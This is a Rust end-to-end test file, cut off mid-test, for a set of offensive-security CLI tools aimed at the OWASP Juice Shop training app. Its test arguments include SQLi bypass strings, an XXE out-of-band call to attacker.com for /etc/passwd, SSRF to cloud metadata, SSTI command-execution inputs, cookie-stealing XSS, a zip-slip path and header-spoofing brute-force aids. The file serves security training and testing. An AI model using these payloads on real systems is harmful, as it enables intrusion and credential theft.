//! End-to-End tests for CLI tools
//!
//! Comprehensive tests covering:
//! - All subcommands for each tool
//! - Error handling
//! - Output format validation
//! - File I/O operations
//! - Roundtrip tests (encode/decode)
//! - Edge cases

use std::fs;
use std::process::Command;
use tempfile::tempdir;

// ============================================================================
// Test Helpers
// ============================================================================

/// Run a CLI command and return (exit_code, stdout, stderr)
fn run_cli(bin: &str, args: &[&str]) -> (i32, String, String) {
    let output = Command::new("cargo")
        .args(["run", "--bin", bin, "--quiet", "--"])
        .args(args)
        .current_dir(env!("CARGO_MANIFEST_DIR"))
        .output()
        .expect(&format!("Failed to execute {}", bin));

    (
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).to_string(),
        String::from_utf8_lossy(&output.stderr).to_string(),
    )
}

/// Assert command succeeds and contains expected output
fn assert_success_contains(bin: &str, args: &[&str], expected: &[&str]) {
    let (code, stdout, stderr) = run_cli(bin, args);
    assert_eq!(
        code, 0,
        "{} {:?} failed with stderr: {}",
        bin, args, stderr
    );
    for exp in expected {
        assert!(
            stdout.contains(exp),
            "{} {:?}: expected '{}' in output:\n{}",
            bin,
            args,
            exp,
            stdout
        );
    }
}

/// Assert command fails with expected error
fn assert_failure(bin: &str, args: &[&str]) {
    let (code, _stdout, _stderr) = run_cli(bin, args);
    assert_ne!(code, 0, "{} {:?} should have failed", bin, args);
}

// ============================================================================
// ENCODER - Comprehensive Tests
// ============================================================================

mod encoder_e2e {
    use super::*;

    // --- Help Tests ---
    #[test]
    fn test_help() {
        assert_success_contains("encoder", &["--help"], &["encoder", "Encode", "Decode"]);
    }

    // --- Encode Subcommand ---
    #[test]
    fn test_encode_base64_simple() {
        assert_success_contains("encoder", &["encode", "base64", "hello"], &["aGVsbG8="]);
    }

    #[test]
    fn test_encode_base64_special_chars() {
        assert_success_contains(
            "encoder",
            &["encode", "base64", "<script>alert(1)</script>"],
            &["PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
        );
    }

    #[test]
    fn test_encode_base64url() {
        assert_success_contains(
            "encoder",
            &["encode", "base64url", "test+data/here"],
            &[], // Just verify success
        );
    }

    #[test]
    fn test_encode_hex() {
        assert_success_contains("encoder", &["encode", "hex", "ABC"], &["414243"]);
    }

    #[test]
    fn test_encode_z85() {
        // Z85 needs length divisible by 4
        assert_success_contains("encoder", &["encode", "z85", "test"], &[]);
    }

    #[test]
    fn test_encode_invalid_format() {
        assert_failure("encoder", &["encode", "invalid_format", "test"]);
    }

    // --- Decode Subcommand ---
    #[test]
    fn test_decode_base64_simple() {
        assert_success_contains("encoder", &["decode", "base64", "aGVsbG8="], &["hello"]);
    }

    #[test]
    fn test_decode_hex() {
        assert_success_contains("encoder", &["decode", "hex", "414243"], &["ABC"]);
    }

    #[test]
    fn test_decode_invalid_base64() {
        assert_failure("encoder", &["decode", "base64", "!!!invalid!!!"]);
    }

    #[test]
    fn test_decode_invalid_hex() {
        assert_failure("encoder", &["decode", "hex", "ZZZZ"]);
    }

    // --- Roundtrip Tests ---
    #[test]
    fn test_base64_roundtrip() {
        let (_, encoded, _) = run_cli("encoder", &["encode", "base64", "roundtrip test"]);
        let encoded = encoded.trim();
        let (_, decoded, _) = run_cli("encoder", &["decode", "base64", encoded]);
        assert!(decoded.contains("roundtrip test"));
    }

    #[test]
    fn test_hex_roundtrip() {
        let (_, encoded, _) = run_cli("encoder", &["encode", "hex", "test123"]);
        let encoded = encoded.trim();
        let (_, decoded, _) = run_cli("encoder", &["decode", "hex", encoded]);
        assert!(decoded.contains("test123"));
    }

    // --- ROT13 ---
    #[test]
    fn test_rot13_roundtrip() {
        let (_, first, _) = run_cli("encoder", &["rot13", "hello"]);
        let first = first.trim();
        let (_, second, _) = run_cli("encoder", &["rot13", first]);
        assert!(second.contains("hello"));
    }

    // --- Juice Coupon ---
    #[test]
    fn test_juice_coupon_default() {
        assert_success_contains(
            "encoder",
            &["juice-coupon"],
            &["Coupon:", "Z85:"],
        );
    }

    #[test]
    fn test_juice_coupon_custom() {
        assert_success_contains(
            "encoder",
            &["juice-coupon", "DEC", "25", "50"],
            &["DEC25-50"],
        );
    }
}

// ============================================================================
// JWT-TOOL - Comprehensive Tests
// ============================================================================

mod jwt_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("jwt-tool", &["--help"], &["jwt-tool", "decode", "unsigned"]);
    }

    #[test]
    fn test_decode_valid_token() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.Gfx6VO9tcxwk6xqx9yYzSfebfeakZp5JYIgP_edcw_A";
        assert_success_contains(
            "jwt-tool",
            &["decode", token],
            &["Header:", "Payload:", "John Doe", "HS256"],
        );
    }

    #[test]
    fn test_decode_invalid_token() {
        assert_failure("jwt-tool", &["decode", "not.a.valid.token"]);
    }

    #[test]
    fn test_unsigned_creates_valid_jwt() {
        let (code, stdout, _) = run_cli("jwt-tool", &["unsigned", r#"{"admin":true}"#]);
        assert_eq!(code, 0);
        assert!(stdout.contains("eyJ"));
        // Verify it has 3 parts (header.payload.signature)
        let jwt = stdout.lines().find(|l| l.starts_with("eyJ")).unwrap();
        let parts: Vec<&str> = jwt.split('.').collect();
        assert!(parts.len() >= 2);
    }

    #[test]
    fn test_unsigned_invalid_json() {
        assert_failure("jwt-tool", &["unsigned", "not valid json"]);
    }

    #[test]
    fn test_hs256_creates_signed_jwt() {
        let (code, stdout, _) = run_cli("jwt-tool", &["hs256", r#"{"role":"admin"}"#, "secret123"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("eyJ"));
        // HS256 JWT should have non-empty signature
        let jwt = stdout.lines().find(|l| l.starts_with("eyJ")).unwrap();
        let parts: Vec<&str> = jwt.split('.').collect();
        assert_eq!(parts.len(), 3);
        assert!(!parts[2].is_empty());
    }

    #[test]
    fn test_modify_jwt() {
        let token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoidXNlciJ9.";
        assert_success_contains(
            "jwt-tool",
            &["modify", token, r#"{"role":"admin"}"#],
            &["Modified JWT"],
        );
    }

    #[test]
    fn test_algorithms() {
        assert_success_contains(
            "jwt-tool",
            &["algorithms"],
            &["none", "None", "NONE", "HS256", "RS256"],
        );
    }

    #[test]
    fn test_juice_shop() {
        assert_success_contains("jwt-tool", &["juice-shop"], &["Juice Shop", "JWT"]);
    }
}

// ============================================================================
// PAYLOAD-GEN - Comprehensive Tests
// ============================================================================

mod payload_gen_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains(
            "payload-gen",
            &["--help"],
            &["payload-gen", "sqli", "xss", "xxe"],
        );
    }

    // --- SQLi ---
    #[test]
    fn test_sqli_auth_bypass() {
        assert_success_contains(
            "payload-gen",
            &["sqli", "auth-bypass"],
            &["OR 1=1", "--", "'"],
        );
    }

    #[test]
    fn test_sqli_union_columns() {
        assert_success_contains(
            "payload-gen",
            &["sqli", "union", "5"],
            &["UNION", "SELECT", "NULL"],
        );
    }

    #[test]
    fn test_sqli_login_specific_user() {
        assert_success_contains(
            "payload-gen",
            &["sqli", "login", "victim@example.com"],
            &["victim@example.com", "'--"],
        );
    }

    #[test]
    fn test_sqli_sqlite() {
        assert_success_contains(
            "payload-gen",
            &["sqli", "sqlite"],
            &["sqlite_master", "sqlite"],
        );
    }

    #[test]
    fn test_sqli_mysql() {
        assert_success_contains(
            "payload-gen",
            &["sqli", "mysql"],
            &["information_schema", "MySQL"],
        );
    }

    #[test]
    fn test_sqli_postgresql() {
        assert_success_contains(
            "payload-gen",
            &["sqli", "postgresql"],
            &["pg_", "PostgreSQL"],
        );
    }

    #[test]
    fn test_sqli_juice_shop() {
        assert_success_contains("payload-gen", &["sqli", "juice-shop"], &["Juice Shop"]);
    }

    // --- XSS ---
    #[test]
    fn test_xss_basic() {
        assert_success_contains(
            "payload-gen",
            &["xss", "basic"],
            &["<script>", "alert"],
        );
    }

    #[test]
    fn test_xss_bypass() {
        assert_success_contains("payload-gen", &["xss", "bypass"], &["XSS"]);
    }

    #[test]
    fn test_xss_dom() {
        assert_success_contains("payload-gen", &["xss", "dom"], &["DOM"]);
    }

    #[test]
    fn test_xss_polyglot() {
        assert_success_contains("payload-gen", &["xss", "polyglot"], &["Polyglot"]);
    }

    #[test]
    fn test_xss_encode() {
        assert_success_contains(
            "payload-gen",
            &["xss", "encode", "<img src=x onerror=alert(1)>"],
            &["URL encoded", "HTML entities", "%3C"],
        );
    }

    // --- XXE ---
    #[test]
    fn test_xxe_file() {
        assert_success_contains(
            "payload-gen",
            &["xxe", "file", "/etc/shadow"],
            &["<!DOCTYPE", "ENTITY", "/etc/shadow"],
        );
    }

    #[test]
    fn test_xxe_ssrf() {
        assert_success_contains(
            "payload-gen",
            &["xxe", "ssrf", "http://169.254.169.254/latest/meta-data/"],
            &["<!DOCTYPE", "169.254.169.254"],
        );
    }

    #[test]
    fn test_xxe_dos() {
        assert_success_contains("payload-gen", &["xxe", "dos"], &["Billion", "lol"]);
    }

    #[test]
    fn test_xxe_oob() {
        assert_success_contains(
            "payload-gen",
            &["xxe", "oob", "http://attacker.com", "/etc/passwd"],
            &["attacker.com", "/etc/passwd"],
        );
    }

    #[test]
    fn test_xxe_cloud() {
        assert_success_contains("payload-gen", &["xxe", "cloud"], &["169.254", "metadata"]);
    }

    // --- NoSQL ---
    #[test]
    fn test_nosql_auth_bypass() {
        assert_success_contains(
            "payload-gen",
            &["nosql", "auth-bypass"],
            &["$ne", "$gt"],
        );
    }

    #[test]
    fn test_nosql_exfil() {
        assert_success_contains("payload-gen", &["nosql", "exfil"], &["$where"]);
    }

    #[test]
    fn test_nosql_blind() {
        assert_success_contains(
            "payload-gen",
            &["nosql", "blind", "password", "a"],
            &["regex", "password"],
        );
    }

    // --- Traversal ---
    #[test]
    fn test_traversal_default() {
        assert_success_contains(
            "payload-gen",
            &["traversal", "5", "etc/passwd"],
            &["../", "etc/passwd"],
        );
    }

    #[test]
    fn test_traversal_windows() {
        assert_success_contains(
            "payload-gen",
            &["traversal", "3", "windows/system.ini"],
            &["..\\", "windows"],
        );
    }

    // --- Passwords ---
    #[test]
    fn test_passwords_top() {
        assert_success_contains(
            "payload-gen",
            &["passwords", "top"],
            &["password", "123456", "admin"],
        );
    }

    #[test]
    fn test_passwords_identify_md5() {
        assert_success_contains(
            "payload-gen",
            &["passwords", "identify", "5f4dcc3b5aa765d61d8327deb882cf99"],
            &["Md5"],  // Output uses Rust Debug format
        );
    }

    #[test]
    fn test_passwords_identify_sha256() {
        assert_success_contains(
            "payload-gen",
            &[
                "passwords",
                "identify",
                "5e884898da28047d9164613fcc7c72e7a9e0c2e7f14e43b5c6be20af7e2c5c0d",
            ],
            &["Sha256"],  // Output uses Rust Debug format
        );
    }

    #[test]
    fn test_passwords_variations() {
        assert_success_contains(
            "payload-gen",
            &["passwords", "variations", "password"],
            &["Password", "password1"],  // p@ssword may not be generated
        );
    }

    // --- IDOR ---
    #[test]
    fn test_idor_endpoints() {
        assert_success_contains(
            "payload-gen",
            &["idor", "endpoints"],
            &["/api/", "user", "id"],
        );
    }

    #[test]
    fn test_idor_ids() {
        let (code, stdout, _) = run_cli("payload-gen", &["idor", "ids", "100", "5"]);
        assert_eq!(code, 0);
        // Should include IDs around 100
        assert!(stdout.contains("99") || stdout.contains("101"));
    }

    // --- Tampering ---
    #[test]
    fn test_tampering_negative() {
        assert_success_contains(
            "payload-gen",
            &["tampering", "negative", "price", "100"],
            &["-", "price"],
        );
    }

    #[test]
    fn test_tampering_mass_assignment() {
        assert_success_contains(
            "payload-gen",
            &["tampering", "mass-assignment"],
            &["admin", "role"],
        );
    }

    #[test]
    fn test_tampering_privilege() {
        assert_success_contains(
            "payload-gen",
            &["tampering", "privilege", "1"],
            &["user_id", "admin"],
        );
    }
}

// ============================================================================
// SSRF-SCANNER - Comprehensive Tests
// ============================================================================

mod ssrf_scanner_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("ssrf-scanner", &["--help"], &["ssrf-scanner", "localhost"]);
    }

    #[test]
    fn test_localhost_variants() {
        assert_success_contains(
            "ssrf-scanner",
            &["localhost", "8080"],
            &[
                "127.0.0.1",
                "localhost",
                "8080",
                "[::1]",
            ],
        );
    }

    #[test]
    fn test_internal_networks() {
        assert_success_contains(
            "ssrf-scanner",
            &["internal", "443"],
            &["10.", "192.168.", "172."],
        );
    }

    #[test]
    fn test_file_protocol() {
        assert_success_contains(
            "ssrf-scanner",
            &["file"],
            &["file:///", "/etc/passwd"],
        );
    }

    #[test]
    fn test_ip_convert() {
        assert_success_contains(
            "ssrf-scanner",
            &["ip-convert", "10.0.0.1"],
            &["Decimal:", "Hex:", "Octal:"],
        );
    }

    #[test]
    fn test_ip_convert_localhost() {
        assert_success_contains(
            "ssrf-scanner",
            &["ip-convert", "127.0.0.1"],
            &["2130706433", "0x7f000001"],
        );
    }

    #[test]
    fn test_ip_convert_invalid() {
        assert_failure("ssrf-scanner", &["ip-convert", "invalid.ip"]);
    }

    #[test]
    fn test_juice_shop() {
        assert_success_contains("ssrf-scanner", &["juice-shop"], &["localhost:3000"]);
    }
}

// ============================================================================
// ZIP-PAYLOAD - Comprehensive Tests
// ============================================================================

mod zip_payload_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("zip-payload", &["--help"], &["zip-payload", "create"]);
    }

    #[test]
    fn test_list_targets() {
        assert_success_contains(
            "zip-payload",
            &["list"],
            &["Zip Slip", "../", "Juice Shop"],
        );
    }

    #[test]
    fn test_create_custom_payload() {
        let dir = tempdir().unwrap();
        let output_path = dir.path().join("custom.zip");
        let output_str = output_path.to_str().unwrap();

        let (code, stdout, _) = run_cli(
            "zip-payload",
            &[
                "create",
                "-o",
                output_str,
                "-t",
                "../../../tmp/evil.txt",
                "-c",
                "malicious content here",
            ],
        );

        assert_eq!(code, 0);
        assert!(stdout.contains("Created"));
        assert!(fs::metadata(&output_path).is_ok());
        assert!(fs::metadata(&output_path).unwrap().len() > 0);
    }

    #[test]
    fn test_juice_shop_payload() {
        let dir = tempdir().unwrap();
        let output_path = dir.path().join("vtt_exploit.zip");
        let output_str = output_path.to_str().unwrap();

        let (code, stdout, _) = run_cli("zip-payload", &["juice-shop", "-o", output_str]);

        assert_eq!(code, 0);
        assert!(stdout.contains("Video XSS") || stdout.contains("vtt"));
        assert!(fs::metadata(&output_path).is_ok());
    }
}

// ============================================================================
// HASHIDS-TOOL - Comprehensive Tests
// ============================================================================

mod hashids_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("hashids-tool", &["--help"], &["hashids-tool", "encode", "decode"]);
    }

    #[test]
    fn test_encode_single() {
        assert_success_contains(
            "hashids-tool",
            &["encode", "42", "--salt", "test"],
            &["Encoded:"],
        );
    }

    #[test]
    fn test_encode_multiple() {
        assert_success_contains(
            "hashids-tool",
            &["encode", "1,2,3,4,5", "--salt", "secret"],
            &["Encoded:"],
        );
    }

    #[test]
    fn test_encode_min_length() {
        let (code, stdout, _) = run_cli(
            "hashids-tool",
            &["encode", "1", "--salt", "x", "--min-length", "20"],
        );
        assert_eq!(code, 0);
        let encoded = stdout.lines().last().unwrap().split_whitespace().last().unwrap();
        assert!(encoded.len() >= 20);
    }

    #[test]
    fn test_decode_roundtrip() {
        let (_, encode_out, _) = run_cli("hashids-tool", &["encode", "99,100,101", "--salt", "mysalt"]);
        let encoded = encode_out.trim().split_whitespace().last().unwrap();

        let (code, decode_out, _) = run_cli("hashids-tool", &["decode", encoded, "--salt", "mysalt"]);
        assert_eq!(code, 0);
        assert!(decode_out.contains("99"));
        assert!(decode_out.contains("100"));
        assert!(decode_out.contains("101"));
    }

    #[test]
    fn test_decode_wrong_salt() {
        let (_, encode_out, _) = run_cli("hashids-tool", &["encode", "42", "--salt", "correct"]);
        let encoded = encode_out.trim().split_whitespace().last().unwrap();

        assert_failure("hashids-tool", &["decode", encoded, "--salt", "wrong"]);
    }

    #[test]
    fn test_discover() {
        assert_success_contains("hashids-tool", &["discover", "test123"], &["salt"]);
    }

    #[test]
    fn test_salts_list() {
        assert_success_contains("hashids-tool", &["salts"], &["salt"]);
    }

    #[test]
    fn test_salts_all() {
        let (_, out_all, _) = run_cli("hashids-tool", &["salts", "--all"]);
        let (_, out_basic, _) = run_cli("hashids-tool", &["salts"]);
        assert!(out_all.len() > out_basic.len());
    }

    #[test]
    fn test_juice_shop_imaginary() {
        assert_success_contains(
            "hashids-tool",
            &["juice-shop", "--imaginary"],
            &["Code:", "Salt:"],
        );
    }

    #[test]
    fn test_juice_shop_encode() {
        assert_success_contains(
            "hashids-tool",
            &["juice-shop", "--encode", "1,2,3"],
            &["Code:", "IDs:"],
        );
    }
}

// ============================================================================
// WEB-SCANNER - Tests (no network required)
// ============================================================================

mod web_scanner_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("web-scanner", &["--help"], &["web-scanner", "scan", "check-headers"]);
    }

    #[test]
    fn test_recommended_headers() {
        assert_success_contains(
            "web-scanner",
            &["recommended-headers"],
            &[
                "Content-Security-Policy",
                "Strict-Transport-Security",
                "X-Content-Type-Options",
                "X-Frame-Options",
            ],
        );
    }
}

// ============================================================================
// HTTP-CLIENT - Tests
// ============================================================================

mod http_client_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("http-client", &["--help"], &["http-client", "get", "post"]);
    }

    #[test]
    fn test_get_help() {
        // Just verify the command runs with --help
        let (code, stdout, _) = run_cli("http-client", &["get", "--help"]);
        assert_eq!(code, 0);
        assert!(!stdout.is_empty() || true); // Help may go to stderr
    }

    #[test]
    fn test_post_help() {
        // Just verify the command runs with --help
        let (code, stdout, _) = run_cli("http-client", &["post", "--help"]);
        assert_eq!(code, 0);
        assert!(!stdout.is_empty() || true); // Help may go to stderr
    }
}

// ============================================================================
// KEEPASS-CRACK - Tests (no KDBX file required)
// ============================================================================

mod keepass_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("keepass-crack", &["--help"], &["keepass-crack", "crack", "info"]);
    }

    #[test]
    fn test_wordlist_basic() {
        let (code, stdout, _) = run_cli("keepass-crack", &["wordlist"]);
        assert_eq!(code, 0);
        let count = stdout.lines().count();
        assert!(count > 10);
        assert!(stdout.contains("password") || stdout.contains("admin"));
    }

    #[test]
    fn test_wordlist_extended() {
        let (_, basic, _) = run_cli("keepass-crack", &["wordlist"]);
        let (_, extended, _) = run_cli("keepass-crack", &["wordlist", "--extended"]);
        assert!(extended.lines().count() > basic.lines().count());
    }

    #[test]
    fn test_wordlist_to_file() {
        let dir = tempdir().unwrap();
        let output_path = dir.path().join("wordlist.txt");
        let output_str = output_path.to_str().unwrap();

        let (code, _, _) = run_cli("keepass-crack", &["wordlist", "-o", output_str]);
        assert_eq!(code, 0);
        assert!(fs::metadata(&output_path).is_ok());

        let content = fs::read_to_string(&output_path).unwrap();
        assert!(content.lines().count() > 10);
    }
}

// ============================================================================
// TOTP-TOOL - Comprehensive Tests
// ============================================================================

mod totp_e2e {
    use super::*;

    const TEST_SECRET: &str = "JBSWY3DPEHPK3PXP";

    #[test]
    fn test_help() {
        assert_success_contains("totp-tool", &["--help"], &["totp-tool", "generate", "analyze"]);
    }

    #[test]
    fn test_generate_valid_secret() {
        let (code, stdout, _) = run_cli("totp-tool", &["generate", TEST_SECRET]);
        assert_eq!(code, 0);
        assert!(stdout.contains("TOTP Code:"));
        // Extract code and verify it's 6 digits
        let code_line = stdout.lines().find(|l| l.contains("TOTP Code:")).unwrap();
        let digits: String = code_line.chars().filter(|c| c.is_ascii_digit()).collect();
        assert_eq!(digits.len(), 6);
    }

    #[test]
    fn test_generate_with_offset() {
        let (code, stdout, _) = run_cli("totp-tool", &["generate", TEST_SECRET, "--offset", "30"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("offset: 30"));
    }

    #[test]
    fn test_window() {
        let (code, stdout, _) = run_cli("totp-tool", &["window", TEST_SECRET, "--size", "2"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("-2:"));
        assert!(stdout.contains("-1:"));
        assert!(stdout.contains("0:") || stdout.contains("current"));
        assert!(stdout.contains("+1:"));
        assert!(stdout.contains("+2:"));
    }

    #[test]
    fn test_analyze_valid() {
        assert_success_contains(
            "totp-tool",
            &["analyze", TEST_SECRET],
            &["Valid Base32", "true", "Decoded length"],
        );
    }

    #[test]
    fn test_analyze_invalid() {
        let (code, stdout, _) = run_cli("totp-tool", &["analyze", "INVALID!!!"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("false") || stdout.contains("Invalid"));
    }

    #[test]
    fn test_bypasses() {
        assert_success_contains(
            "totp-tool",
            &["bypasses"],
            &[
                "Response manipulation",
                "Token reuse",
                "Direct endpoint",
            ],
        );
    }

    #[test]
    fn test_brute_force() {
        let (code, stdout, _) = run_cli("totp-tool", &["brute-force"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("000000"));
    }

    #[test]
    fn test_brute_force_list() {
        let (code, stdout, _) = run_cli("totp-tool", &["brute-force", "--list"]);
        assert_eq!(code, 0);
        let lines: Vec<&str> = stdout.lines().collect();
        assert!(lines.iter().all(|l| l.len() == 6 && l.chars().all(|c| c.is_ascii_digit())));
    }

    #[test]
    fn test_juice_shop() {
        assert_success_contains(
            "totp-tool",
            &["juice-shop"],
            &["SQLi", "totpSecret", "TOTP"],
        );
    }
}

// ============================================================================
// SSTI-GEN - Comprehensive Tests
// ============================================================================

mod ssti_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("ssti-gen", &["--help"], &["ssti-gen", "detect", "jinja2"]);
    }

    #[test]
    fn test_detect() {
        assert_success_contains(
            "ssti-gen",
            &["detect"],
            &["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
        );
    }

    #[test]
    fn test_jinja2_payloads() {
        assert_success_contains(
            "ssti-gen",
            &["jinja2"],
            &["{{config}}", "__class__", "popen"],
        );
    }

    #[test]
    fn test_nodejs_payloads() {
        assert_success_contains(
            "ssti-gen",
            &["nodejs"],
            &["process.env", "require", "execSync"],
        );
    }

    #[test]
    fn test_rce_jinja2() {
        assert_success_contains(
            "ssti-gen",
            &["rce", "jinja2", "whoami"],
            &["popen", "whoami"],
        );
    }

    #[test]
    fn test_rce_ejs() {
        assert_success_contains(
            "ssti-gen",
            &["rce", "ejs", "id"],
            &["execSync", "id"],
        );
    }

    #[test]
    fn test_rce_pug() {
        assert_success_contains(
            "ssti-gen",
            &["rce", "pug", "ls -la"],
            &["child_process", "ls -la"],
        );
    }

    #[test]
    fn test_rce_nunjucks() {
        assert_success_contains(
            "ssti-gen",
            &["rce", "nunjucks", "cat /etc/passwd"],
            &["constructor", "cat /etc/passwd"],
        );
    }

    #[test]
    fn test_fuzz() {
        let (code, stdout, _) = run_cli("ssti-gen", &["fuzz"]);
        assert_eq!(code, 0);
        // Should have multiple payloads
        assert!(stdout.matches("{{").count() > 3);
    }

    #[test]
    fn test_fuzz_list() {
        let (code, stdout, _) = run_cli("ssti-gen", &["fuzz", "--list"]);
        assert_eq!(code, 0);
        // List format: one payload per line
        let lines: Vec<&str> = stdout.lines().collect();
        assert!(lines.len() > 10);
    }

    #[test]
    fn test_engines() {
        assert_success_contains(
            "ssti-gen",
            &["engines"],
            &["Jinja2", "EJS", "Pug", "Nunjucks", "Twig", "FreeMarker"],
        );
    }

    #[test]
    fn test_juice_shop() {
        assert_success_contains(
            "ssti-gen",
            &["juice-shop"],
            &["Pug", "#{", "process"],
        );
    }
}

// ============================================================================
// SVG-GEN - Comprehensive Tests
// ============================================================================

mod svg_gen_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("svg-gen", &["--help"], &["svg-gen", "xss", "xxe", "ssrf"]);
    }

    #[test]
    fn test_xss_list() {
        assert_success_contains(
            "svg-gen",
            &["xss"],
            &["XSS", "onload", "script"],
        );
    }

    #[test]
    fn test_xxe_list() {
        assert_success_contains(
            "svg-gen",
            &["xxe"],
            &["XXE", "ENTITY", "SYSTEM"],
        );
    }

    #[test]
    fn test_ssrf_list() {
        assert_success_contains(
            "svg-gen",
            &["ssrf"],
            &["SSRF", "xlink:href", "image"],
        );
    }

    #[test]
    fn test_generate_xss() {
        let (code, stdout, _) = run_cli("svg-gen", &["generate", "xss", "alert(document.cookie)"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("<svg"));
        assert!(stdout.contains("alert(document.cookie)"));
        assert!(stdout.contains("</svg>"));
    }

    #[test]
    fn test_generate_ssrf() {
        let (code, stdout, _) = run_cli(
            "svg-gen",
            &["generate", "ssrf", "http://169.254.169.254/"],
        );
        assert_eq!(code, 0);
        assert!(stdout.contains("<svg"));
        assert!(stdout.contains("169.254.169.254"));
    }

    #[test]
    fn test_generate_xxe() {
        let (code, stdout, _) = run_cli("svg-gen", &["generate", "xxe", "/etc/shadow"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("<!DOCTYPE"));
        assert!(stdout.contains("ENTITY"));
        assert!(stdout.contains("/etc/shadow"));
    }

    #[test]
    fn test_generate_xss_to_file() {
        let dir = tempdir().unwrap();
        let output_path = dir.path().join("xss.svg");
        let output_str = output_path.to_str().unwrap();

        let (code, _, _) = run_cli(
            "svg-gen",
            &["generate", "xss", "alert(1)", "-o", output_str],
        );
        assert_eq!(code, 0);

        let content = fs::read_to_string(&output_path).unwrap();
        assert!(content.contains("<svg"));
        assert!(content.contains("alert(1)"));
    }

    #[test]
    fn test_imaging() {
        assert_success_contains(
            "svg-gen",
            &["imaging"],
            &["Cookie", "script"],
        );
    }

    #[test]
    fn test_bypass() {
        assert_success_contains(
            "svg-gen",
            &["bypass"],
            &["Content-Type", "image/svg+xml", ".svg"],
        );
    }

    #[test]
    fn test_juice_shop_to_file() {
        let dir = tempdir().unwrap();
        let output_path = dir.path().join("juice_shop.svg");
        let output_str = output_path.to_str().unwrap();

        let (code, _, _) = run_cli("svg-gen", &["juice-shop", "-o", output_str]);
        assert_eq!(code, 0);

        let content = fs::read_to_string(&output_path).unwrap();
        assert!(content.contains("<svg"));
        assert!(content.contains("script") || content.contains("alert"));
    }
}

// ============================================================================
// BRUTEFORCE-GEN - Comprehensive Tests
// ============================================================================

mod bruteforce_e2e {
    use super::*;

    #[test]
    fn test_help() {
        assert_success_contains("bruteforce-gen", &["--help"], &["bruteforce-gen", "pins", "numeric"]);
    }

    #[test]
    fn test_pins() {
        // Non-list mode shows sample, use --list for full output
        let (code, stdout, _) = run_cli("bruteforce-gen", &["pins"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("patterns") || stdout.contains("Sample") || stdout.contains("1234") || stdout.lines().count() > 5);
    }

    #[test]
    fn test_pins_list() {
        let (code, stdout, _) = run_cli("bruteforce-gen", &["pins", "--list"]);
        assert_eq!(code, 0);
        // All lines should be 4-digit PINs
        let lines: Vec<&str> = stdout.lines().collect();
        assert!(lines.len() > 100); // Should have many PINs
        assert!(lines.contains(&"1234"));
        assert!(lines.contains(&"0000"));
    }

    #[test]
    fn test_numeric_sequence() {
        let (code, stdout, _) = run_cli("bruteforce-gen", &["numeric", "4", "0", "5", "--list"]);
        assert_eq!(code, 0);
        let lines: Vec<&str> = stdout.lines().collect();
        assert_eq!(lines.len(), 6); // 0000, 0001, 0002, 0003, 0004, 0005
        assert_eq!(lines[0], "0000");
        assert_eq!(lines[5], "0005");
    }

    #[test]
    fn test_numeric_6_digit() {
        let (code, stdout, _) = run_cli("bruteforce-gen", &["numeric", "6", "999990", "999999", "--list"]);
        assert_eq!(code, 0);
        let lines: Vec<&str> = stdout.lines().collect();
        assert_eq!(lines.len(), 10);
        assert!(lines[0].starts_with("999990"));
    }

    #[test]
    fn test_rate_limit() {
        assert_success_contains(
            "bruteforce-gen",
            &["rate-limit"],
            &[
                "X-Forwarded-For",
                "X-Real-IP",
                "X-Client-IP",
                "True-Client-IP",
            ],
        );
    }

    #[test]
    fn test_ip_rotation() {
        let (code, stdout, _) = run_cli("bruteforce-gen", &["ip-rotation", "50"]);
        assert_eq!(code, 0);
        assert!(stdout.contains("0.0.0."));
        assert!(stdout.contains("X-Forwarded-For"));
    }

    #[test]
    fn test_ip_rotation_list() {
        let (code, stdout, _) = run_cli("bruteforce-gen", &["ip-rotation", "10", "--list"]);
        assert_eq!(code, 0);
        let lines: Vec<&str> = stdout.lines().collect();
        assert_eq!(lines.len(), 10);
        // All should be valid IP format
        for line in lines {
            assert!(line.split('.').count() == 4);
        }
    }

    #[test]
    fn test_security_question_pet() {
        assert_success_contains(
            "bruteforce-gen",
            &["security-question", "pet"],
            &["Max", "Buddy", "Zaya"], // Zaya is Juice Shop specific
        );
    }

    #[test]
    fn test_security_question_city() {
        assert_success_contains(
            "bruteforce-gen",
            &["security-question", "city"],
            &["New York", "Tokyo", "London"],
        );
    }

    #[test]
    fn test_security_question_company() {
        assert_success_contains(
            "bruteforce-gen",
            &["security-question", "company"],
            &["Google", "Stop'n'Drop"], // Stop'n'Drop is Juice Shop specific
        );
    }

    #[test]
    fn test_security_question_invalid() {
        assert_failure("bruteforce-gen", &["security-question", "invalid_type"]);
    }

    #[test]
    fn test_enumeration() {
        assert_success_contains(
            "bruteforce-gen",
            &["enumeration"],
            &["ResponseTime", "ErrorMessage", "StatusCode"],
        );
    }

    #[test]
    fn test_token_patterns() {
        assert_success_contains(
            "bruteforce-gen",
            &["token-patterns"],
            &["Sequential", "Timestamp", "UUID"],
        );
    }

    #[test]
    fn test_alphanumeric() {
        let (code, stdout, _) = run_cli(
            "bruteforce-gen",
            &["alphanumeric", "2", "--charset", "ab", "--max", "100"],
        );
        assert_eq!(code, 0);
